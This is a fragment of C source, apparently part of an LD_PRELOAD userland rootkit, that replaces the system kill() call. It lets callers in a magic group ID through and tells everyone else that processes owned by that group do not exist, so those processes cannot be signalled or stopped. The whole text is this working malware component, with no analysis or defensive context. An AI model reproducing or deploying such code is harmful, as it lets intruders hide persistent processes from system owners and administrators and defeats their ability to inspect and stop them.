int kill(pid_t pid, int sig) {
  struct stat s_fstat;
  char procid[20]; // big cause VZ systems...
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_kill) old_kill = real_dlsym(libc, "kill");
  if (!old_xstat) old_xstat = find_sym(libc, "__xstat");
  memset(&s_fstat, 0, sizeof(stat));
  if (getgid() == MAGIC_GID) return old_kill(pid,sig);

  snprintf(procid,sizeof(procid)-1,"/proc/%d",pid);
  old_xstat(_STAT_VER, procid, &s_fstat);

  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
  return old_kill(pid,sig);
}

